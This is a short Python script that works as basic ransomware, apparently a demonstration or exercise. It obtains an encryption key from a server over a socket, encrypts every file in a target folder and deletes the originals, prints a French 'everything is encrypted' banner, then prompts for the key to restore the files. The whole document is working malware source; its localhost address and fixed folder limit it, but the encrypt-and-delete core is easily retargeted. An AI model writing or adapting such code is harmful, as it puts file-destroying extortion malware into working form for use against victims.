from cryptography.fernet import Fernet
import socket, os, pyfiglet

def encrypt(path):
    with open(path, "rb") as normal_file:
        with open(path + ".encrypt", "wb") as encrypted_file: 
            encrypted_content = fn.encrypt(normal_file.read())
            encrypted_file.write(encrypted_content)
    os.remove(path)

def decrypt(path):
    with open(path, "rb") as encrypted_file:
        with open(path[:-8], "wb") as normal_file: 
            decrypted_content = fn.decrypt(encrypted_file.read())
            normal_file.write(decrypted_content)
    os.remove(path)

base_directory = os.path.dirname(os.path.abspath(__file__))
target_directory = os.path.join(base_directory, "files_to_encrypt")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 5000))
s.send(b'key')
key = s.recv(2048)
s.close()

fn = Fernet(key)

for path, dirs, files in os.walk(target_directory):  
    for f in files:
        encrypt(os.path.join(path, f))

del key
del fn

banner = pyfiglet.figlet_format("TOUT EST CHIFFRE !!!")
print(banner)

while True:
    key = input("Key == ")
    fn = Fernet(key)
    try:
        for path, dirs, files in os.walk(target_directory):  # Utilise le chemin dynamique
            for f in files:
                if f.endswith(".encrypt"):  # Modification ici
                    decrypt(os.path.join(path, f))
                    print(os.path.join(path, f), "restored!")
    except Exception as e:
        print("Erreur ->", e)
    else:
        break
